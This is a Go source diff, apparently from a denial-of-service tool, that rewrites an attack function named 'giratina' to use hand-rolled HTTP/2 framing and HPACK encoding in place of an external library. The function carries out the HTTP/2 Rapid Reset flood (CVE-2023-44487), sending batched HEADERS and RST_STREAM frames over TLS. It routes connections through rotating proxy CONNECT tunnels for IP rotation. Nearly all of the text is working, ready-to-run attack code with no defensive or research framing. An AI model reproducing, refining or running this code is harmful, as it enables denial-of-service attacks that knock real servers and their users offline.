@@ -22,8 +22,6 @@ import (
 	"sync/atomic"
 	"time"
 
-	"golang.org/x/net/http2"
-	"golang.org/x/net/http2/hpack"
 )
 
 const hasAttacks = true
@@ -1267,8 +1265,134 @@ func darkraiProxy(target string, targetPort, duration int, useProxy bool) {
 }
 
 // giratina opens a single HTTP/2 TLS connection and continuously sends
-// HEADERS + RST_STREAM frame pairs (rapid reset). Uses raw h2 framing via
-// golang.org/x/net/http2 for maximum throughput. Supports proxy CONNECT tunnels.
+// ============================================================================
+// Raw HTTP/2 framing — no external dependencies.
+// Implements just enough of RFC 7540 + RFC 7541 (HPACK) for rapid reset:
+// client preface, SETTINGS, HEADERS (static table only), RST_STREAM.
+// ============================================================================
+
+const h2ClientPreface = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
+
+// h2Frame types and flags
+const (
+	h2FrameData     = 0x0
+	h2FrameHeaders  = 0x1
+	h2FrameRST      = 0x3
+	h2FrameSettings = 0x4
+	h2FrameGoAway   = 0x7
+
+	h2FlagEndStream  = 0x1
+	h2FlagEndHeaders = 0x4
+	h2FlagSettingsAck = 0x1
+
+	h2ErrCancel = uint32(8)
+)
+
+// h2WriteFrame writes a single HTTP/2 frame to w.
+func h2WriteFrame(w *bufio.Writer, frameType, flags byte, streamID uint32, payload []byte) error {
+	l := len(payload)
+	hdr := [9]byte{
+		byte(l >> 16), byte(l >> 8), byte(l),
+		frameType,
+		flags,
+		byte(streamID>>24) & 0x7f, byte(streamID >> 16), byte(streamID >> 8), byte(streamID),
+	}
+	if _, err := w.Write(hdr[:]); err != nil {
+		return err
+	}
+	_, err := w.Write(payload)
+	return err
+}
+
+// h2WriteSettings writes a SETTINGS frame with two entries:
+// MAX_CONCURRENT_STREAMS=1000, INITIAL_WINDOW_SIZE=65535.
+func h2WriteSettings(w *bufio.Writer) error {
+	payload := make([]byte, 12)
+	// MAX_CONCURRENT_STREAMS (0x3) = 1000
+	binary.BigEndian.PutUint16(payload[0:], 0x3)
+	binary.BigEndian.PutUint32(payload[2:], 1000)
+	// INITIAL_WINDOW_SIZE (0x4) = 65535
+	binary.BigEndian.PutUint16(payload[6:], 0x4)
+	binary.BigEndian.PutUint32(payload[8:], 65535)
+	return h2WriteFrame(w, h2FrameSettings, 0, 0, payload)
+}
+
+// h2WriteSettingsAck sends a SETTINGS ACK.
+func h2WriteSettingsAck(w *bufio.Writer) error {
+	return h2WriteFrame(w, h2FrameSettings, h2FlagSettingsAck, 0, nil)
+}
+
+// h2WriteRST writes a RST_STREAM frame with the given error code.
+func h2WriteRST(w *bufio.Writer, streamID, errCode uint32) error {
+	var payload [4]byte
+	binary.BigEndian.PutUint32(payload[:], errCode)
+	return h2WriteFrame(w, h2FrameRST, 0, streamID, payload[:])
+}
+
+// hpackBlock builds a minimal HPACK header block using RFC 7541 static table.
+//
+// Static table entries used:
+//   index 2 → :method: GET        (0x82 = indexed representation)
+//   index 4 → :path: /            (0x84 = indexed representation)
+//   index 7 → :scheme: https      (0x87 = indexed representation)
+//   index 1 → :authority (name)   (0x01 = literal without indexing, indexed name)
+//
+// For non-root paths: literal without indexing, indexed name :path (index 4).
+// RFC 7541 §6.2.2: literal without indexing, indexed name → 0b0000_xxxx
+//   where xxxx is the 4-bit index (fits for indices 1-14).
+func hpackBlock(authority, path string) []byte {
+	var b bytes.Buffer
+
+	// :method: GET — static index 2
+	b.WriteByte(0x82)
+
+	// :path
+	if path == "/" || path == "" {
+		// static index 4 → :path: /
+		b.WriteByte(0x84)
+	} else {
+		// literal without indexing, indexed name, index=4
+		b.WriteByte(0x04)
+		b.WriteByte(byte(len(path)))
+		b.WriteString(path)
+	}
+
+	// :scheme: https — static index 7
+	b.WriteByte(0x87)
+
+	// :authority — literal without indexing, indexed name, index=1
+	b.WriteByte(0x01)
+	b.WriteByte(byte(len(authority)))
+	b.WriteString(authority)
+
+	return b.Bytes()
+}
+
+// h2WriteHeaders writes a HEADERS frame with END_STREAM and END_HEADERS set.
+func h2WriteHeaders(w *bufio.Writer, streamID uint32, hpack []byte) error {
+	return h2WriteFrame(w, h2FrameHeaders, h2FlagEndStream|h2FlagEndHeaders, streamID, hpack)
+}
+
+// h2ReadFrame reads one HTTP/2 frame header and discards the payload.
+// Returns frame type, flags, stream ID, and any error.
+func h2ReadFrame(r io.Reader) (frameType, flags byte, streamID uint32, err error) {
+	var hdr [9]byte
+	if _, err = io.ReadFull(r, hdr[:]); err != nil {
+		return
+	}
+	length := int(hdr[0])<<16 | int(hdr[1])<<8 | int(hdr[2])
+	frameType = hdr[3]
+	flags = hdr[4]
+	streamID = binary.BigEndian.Uint32(hdr[5:]) & 0x7fffffff
+	if length > 0 {
+		_, err = io.ReadFull(r, make([]byte, length))
+	}
+	return
+}
+
+// giratina sends HEADERS+RST_STREAM pairs (CVE-2023-44487 rapid reset).
+// Pure stdlib — no external HTTP/2 package required.
+// Supports proxy CONNECT tunnels for IP rotation.
 func giratina(targetURL string, stop <-chan struct{}) error {
 	u, err := url.Parse(targetURL)
 	if err != nil {
@@ -1278,17 +1402,13 @@ func giratina(targetURL string, stop <-chan struct{}) error {
 	host := u.Hostname()
 	port := u.Port()
 	if port == "" {
-		if u.Scheme == "https" {
-			port = "443"
-		} else {
-			port = "443" // force TLS for h2
-		}
+		port = "443"
 	}
 	addr := net.JoinHostPort(host, port)
 
 	// Dial — through proxy CONNECT tunnel or direct
 	var rawConn net.Conn
-	proxy := persian() // thread-safe round-robin proxy selection
+	proxy := persian()
 	if proxy != "" {
 		pURL, err := url.Parse(proxy)
 		if err != nil {
@@ -1298,8 +1418,6 @@ func giratina(targetURL string, stop <-chan struct{}) error {
 		if err != nil {
 			return err
 		}
-
-		// Build CONNECT request
 		connectReq := "CONNECT " + addr + " HTTP/1.1\r\nHost: " + addr + "\r\n"
 		if pURL.User != nil {
 			user := pURL.User.Username()
@@ -1308,14 +1426,11 @@ func giratina(targetURL string, stop <-chan struct{}) error {
 			connectReq += "Proxy-Authorization: Basic " + cred + "\r\n"
 		}
 		connectReq += "\r\n"
-
 		if _, err := rawConn.Write([]byte(connectReq)); err != nil {
 			rawConn.Close()
 			return err
 		}
-
-		br := bufio.NewReader(rawConn)
-		resp, err := http.ReadResponse(br, nil)
+		resp, err := http.ReadResponse(bufio.NewReader(rawConn), nil)
 		if err != nil {
 			rawConn.Close()
 			return fmt.Errorf("CONNECT failed: %w", err)
@@ -1332,7 +1447,7 @@ func giratina(targetURL string, stop <-chan struct{}) error {
 		}
 	}
 
-	// TLS handshake with ALPN h2
+	// TLS with ALPN h2
 	tlsConn := tls.Client(rawConn, &tls.Config{
 		ServerName:         host,
 		NextProtos:         []string{alpnH2},
@@ -1348,60 +1463,45 @@ func giratina(targetURL string, stop <-chan struct{}) error {
 		return fmt.Errorf("h2 not negotiated")
 	}
 
-	// HTTP/2 client connection preface
-	if _, err := tlsConn.Write([]byte(http2.ClientPreface)); err != nil {
+	bw := bufio.NewWriterSize(tlsConn, 65536)
+
+	// Client connection preface
+	if _, err := bw.WriteString(h2ClientPreface); err != nil {
 		return err
 	}
-
-	// Buffered framer — batch frames before flushing to wire
-	bw := bufio.NewWriterSize(tlsConn, 65536)
-	framer := http2.NewFramer(bw, tlsConn)
-	framer.AllowIllegalWrites = true
-
-	// Send initial SETTINGS
-	framer.WriteSettings(
-		http2.Setting{ID: http2.SettingMaxConcurrentStreams, Val: 1000},
-		http2.Setting{ID: http2.SettingInitialWindowSize, Val: 65535},
-	)
+	if err := h2WriteSettings(bw); err != nil {
+		return err
+	}
 	bw.Flush()
 
-	// Background reader — consume server frames so the connection doesn't stall
+	// Background reader — ACK server SETTINGS, detect GOAWAY
 	connDone := make(chan struct{})
 	guardedGo("giratina-reader", func() {
 		defer close(connDone)
 		for {
-			f, err := framer.ReadFrame()
+			ft, fl, _, err := h2ReadFrame(tlsConn)
 			if err != nil {
 				return
 			}
-			switch sf := f.(type) {
-			case *http2.SettingsFrame:
-				if !sf.IsAck() {
-					framer.WriteSettingsAck()
-					bw.Flush()
-				}
-			case *http2.GoAwayFrame:
-				return // server rejected us
+			if ft == h2FrameSettings && fl&h2FlagSettingsAck == 0 {
+				h2WriteSettingsAck(bw)
+				bw.Flush()
+			}
+			if ft == h2FrameGoAway {
+				return
 			}
 		}
 	})
-
-	// HPACK encoder for pseudo-headers
-	var hdrBuf bytes.Buffer
-	enc := hpack.NewEncoder(&hdrBuf)
 
 	path := u.RequestURI()
 	if path == "" {
 		path = "/"
 	}
-	scheme := u.Scheme
-	if scheme == "" || scheme == "http" {
-		scheme = "https"
-	}
 	authority := u.Host
+	hdrs := hpackBlock(authority, path)
 
 	var streamID uint32 = 1
-	const batchSize = 100 // flush every 100 HEADERS+RST pairs
+	const batchSize = 100
 
 	for {
 		select {
@@ -1413,31 +1513,16 @@ func giratina(targetURL string, stop <-chan struct{}) error {
 		}
 
 		for i := 0; i < batchSize; i++ {
-			hdrBuf.Reset()
-			enc.WriteField(hpack.HeaderField{Name: ":method", Value: "GET"})
-			enc.WriteField(hpack.HeaderField{Name: ":path", Value: path})
-			enc.WriteField(hpack.HeaderField{Name: ":scheme", Value: scheme})
-			enc.WriteField(hpack.HeaderField{Name: ":authority", Value: authority})
-			enc.WriteField(hpack.HeaderField{Name: "user-agent", Value: randUA()})
-
-			if err := framer.WriteHeaders(http2.HeadersFrameParam{
-				StreamID:      streamID,
-				BlockFragment: hdrBuf.Bytes(),
-				EndStream:     true,
-				EndHeaders:    true,
-			}); err != nil {
+			if err := h2WriteHeaders(bw, streamID, hdrs); err != nil {
 				return err
 			}
-
-			if err := framer.WriteRSTStream(streamID, http2.ErrCodeCancel); err != nil {
+			if err := h2WriteRST(bw, streamID, h2ErrCancel); err != nil {
 				return err
 			}
-
 			streamID += 2
-
 			if streamID >= 1<<31-1 {
 				bw.Flush()
-				return nil // stream IDs exhausted — worker will reconnect
+				return nil
 			}
 		}
 		bw.Flush()
